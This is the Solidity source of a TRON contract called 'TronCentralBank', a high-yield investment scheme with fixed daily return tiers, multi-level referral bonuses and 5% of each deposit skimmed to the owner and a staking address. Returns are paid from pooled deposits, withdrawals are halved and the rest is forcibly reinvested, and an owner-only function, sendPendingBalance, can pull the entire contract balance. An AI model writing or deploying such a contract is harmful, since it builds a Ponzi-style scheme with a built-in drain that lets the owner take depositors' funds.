//SourceUnit: troncentralbank.sol

pragma solidity 0.4.25;

contract TronCentralBank {
    using SafeMath for uint256;

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 pending_withdrawl;
        uint256 total_match_bonus;
        Deposit[] deposits;
        uint256 lastsettledcontractbonus;
        mapping(uint8 => uint256) structure;
    }

    address public owner;
    address public stakingAddress;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    uint256 public withdrawFee;
    uint256 public releaseTime = 1598104800;//1598104800
    uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
    uint256 constant public BASE_PERCENT = 0;
    uint256 constant public TIME_STEP = 1 days;
    uint256 constant public PERCENTS_DIVIDER = 100000;


    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;
    mapping(address => bool) public whiteListed;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(address _stakingAddress) public {
        owner = msg.sender;
        stakingAddress = _stakingAddress;
        withdrawFee = 100 trx;
        whiteListed[owner] = true;

        tarifs.push(Tarif(50, 125));
        tarifs.push(Tarif(50, 165));
        tarifs.push(Tarif(40, 200));
       
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        
        address up = players[_addr].upline;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 100;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }


            players[_addr].upline = _upline;

       
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(address _upline,bool isReinvest) public payable {
        
        uint8 _tarif=0;
        uint amount=msg.value;
        if(isReinvest && amount==0 && players[msg.sender].pending_withdrawl>0){
           amount= players[msg.sender].pending_withdrawl;
           players[msg.sender].pending_withdrawl=0;
        }
     
            if(amount>10 trx && amount<=9999 trx){
                _tarif=0;
            }
            else if(amount>9999 trx && amount<=49999 trx){
                _tarif=1;
            }
            else if(amount>49999 trx){
                _tarif=2;
            }
       
        
         require(amount >= 10 trx, "Min 10 Trx");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        
        
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];

     
        _setUpline(msg.sender, _upline);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));
        
         owner.transfer(amount.mul(5).div(100));
        stakingAddress.transfer(amount.mul(5).div(100));
        
        if(player.deposits.length==1){
        player.lastsettledcontractbonus=getStepContractBalance();
        player.last_payout=now;
        }
        
        player.total_invested += amount;
        invested += amount;
        
       
        _refPayout(msg.sender, amount);

       

        emit NewDeposit(msg.sender, amount, _tarif);
    }

    function withdraw() payable external {
      
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus+player.pending_withdrawl;
          require(amount >= withdrawFee || whiteListed[msg.sender] == true);

        amount=amount.div(2);
        
        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount.add(amount);
        player.pending_withdrawl=amount;
        withdrawn += amount;
        player.lastsettledcontractbonus=getStepContractBalance();
        
        
        msg.sender.transfer(amount);
        
        deposit(player.upline,true);

        emit Withdraw(msg.sender, amount);
    }
    
    
    function reinvest() payable external {
      
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus+player.pending_withdrawl;
          require(amount >= 10 trx);

        amount=amount;
        
        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        player.pending_withdrawl=amount;
        withdrawn += amount;
        player.lastsettledcontractbonus=getStepContractBalance();
        
        
        deposit(player.upline,true);

        emit Withdraw(msg.sender, amount);
    }
    
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                
              value+= dep.amount.mul(getUserPercentRate(_addr)).div(PERCENTS_DIVIDER);
        
            }
        }

        return value;
    }
    
    function getContractBalanceRate(address userAddress) public view returns (uint256) {
        
        uint256 contractBalancePercent=getStepContractBalance();
        if(contractBalancePercent<players[userAddress].lastsettledcontractbonus)
        return BASE_PERCENT;
        return BASE_PERCENT.add(contractBalancePercent.sub(players[userAddress].lastsettledcontractbonus).mul(20));
        
    }
    
    function getStepContractBalance() public view returns (uint256)
    {
            uint256 contractBalance = address(this).balance;//invested;
         return contractBalance.div(CONTRACT_BALANCE_STEP);
    }
    
    function getUserPercentRate(address userAddress) public view returns (uint256) {
        Player storage user = players[userAddress];

        uint256 contractBalanceRate = getContractBalanceRate(userAddress);
        if (user.total_invested>0) {
            uint256 timeMultiplier = (now.sub(user.last_payout)).div(TIME_STEP);
        if(timeMultiplier>0){
                timeMultiplier=timeMultiplier.sub(1);
            }
            return contractBalanceRate.add(timeMultiplier.mul(20));
        } else {
            return contractBalanceRate;
        }
    }
    
    function setWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = true;
    }

    function removeWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = false;
    }

    function setWithdrawFee(uint256 newFee) public {
        require(msg.sender == owner,"unauthorized call");
        withdrawFee = newFee;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    
    /* In case of any issue with smart contract *****/
     function sendPendingBalance(uint amount) public
    {
         require(msg.sender==owner, "You are not authorized");  
        if(msg.sender==owner){
        if(amount>0 && amount<=getEthBalance()){
         if (!address(uint160(owner)).send(amount))
         {
             
         }
        }
        }
    }
   
    function getEthBalance() public view returns(uint) {
    return address(this).balance;
    }

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount.mul(to - from).mul(tarif.percent).div(tarif.life_days).div(8640000);
            }
        }

        return values;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}